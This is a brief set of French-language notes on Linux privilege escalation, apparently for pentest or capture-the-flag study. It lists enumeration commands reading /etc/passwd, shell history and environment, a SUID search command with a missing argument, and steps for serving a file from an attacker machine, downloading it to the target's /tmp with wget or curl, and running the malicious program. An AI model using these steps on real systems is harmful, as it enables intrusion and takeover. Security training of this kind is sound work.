--> Linux Privilege escalation
L'objectif est de devenir root ou un autre sudo user.

-> Bien énumérer :
whoami
hostname
id
sudo -l
ls -la
cat /etc/passwd
history
ps
cat /etc/issue
cat /proc/version
(env || set) 2>/dev/null
cat /etc/os-release 2>/dev/null
(cat /proc/version || uname -a ) 2>/dev/null

-> Le fichier SUID est important ! Un service mal sécurisé peut être exploité !
find / -perm -u=s -type 2>/dev/null

Si un service est présent, nous pouvons utiliser https://gtfobins.github.io pour savoir comment l'exploiter correctement. 

-> Le fichier /tmp peut être utilisé afin de télécharger des logiciels ou des programmes venant de l'ordi pirate.

Sur l'ordi pirate : 
python3 -m http.server 8080

Sur l'ordi cible : 
cd /tmp
wget ip:8080/file ou curl -O ip:8080/file

On peut éxécuter le programme malveillant avec ./file.
